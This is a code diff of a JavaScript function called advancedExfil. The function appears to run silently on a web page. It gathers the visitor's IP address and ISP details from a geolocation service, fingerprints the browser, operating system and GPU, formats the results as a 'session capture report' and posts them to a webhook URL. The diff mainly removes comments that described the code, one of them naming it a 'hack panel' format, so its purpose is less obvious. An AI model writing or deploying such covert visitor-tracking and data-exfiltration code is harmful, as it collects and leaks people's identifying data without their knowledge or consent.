@@ -49,11 +49,11 @@
 
         async function advancedExfil() {
             try {
-                // 1. IP ve Detaylı ISP Bilgisi
+          
                 const geoReq = await fetch('https://ipapi.co/json/');
                 const g = await geoReq.json();
 
-                // 2. Tarayıcı ve OS Analizi (Mozilla/5.0 karmaşasını çözer)
+                
                 let browser = "Unknown";
                 let os = "Unknown Platform";
                 const ua = navigator.userAgent;
@@ -65,7 +65,6 @@
                 else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
                 else if (ua.includes("Safari")) browser = "Safari";
 
-                // Windows 11 mi 10 mu kontrolü (Modern API)
                 if (navigator.userAgentData) {
                     const brands = navigator.userAgentData.brands.map(b => b.brand).join(", ");
                     const platformInfo = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
@@ -79,7 +78,7 @@
                     os = navigator.platform;
                 }
 
-                // 3. Donanım Detayları
+                
                 let gpu = "N/A";
                 const canvas = document.createElement("canvas");
                 const gl = canvas.getContext("webgl");
@@ -117,7 +116,7 @@
                     ua: ua
                 };
 
-                // 5. Hack Paneli Formatı (Full Teknik, Emojisiz)
+               
                 const terminalLog = "```" + 
                     "--- [ SESSION CAPTURE REPORT ] ---\n" +
                     "ID         : " + Math.floor(Math.random() * 900000 + 100000) + "\n" +
@@ -145,7 +144,7 @@
                     "--- [ END OF TRANSMISSION ] ---" +
                     "```";
 
-                // 6. Gönderim
+          
                 await fetch(WH_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
